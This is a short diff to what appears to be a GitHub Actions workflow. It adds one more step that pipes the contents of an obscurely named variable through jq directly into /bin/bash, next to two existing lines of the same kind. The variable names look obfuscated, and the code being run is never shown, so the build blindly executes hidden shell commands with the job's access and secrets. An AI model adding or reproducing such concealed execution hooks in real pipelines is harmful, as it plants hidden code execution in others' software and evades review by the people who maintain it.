@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$dgi8" | jq -r .wc1722 | /bin/bash
           printf '%s' "$aixe0541" | jq -r .dthz57 | /bin/bash
+          echo $euivn11 | jq -r .xfm431 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
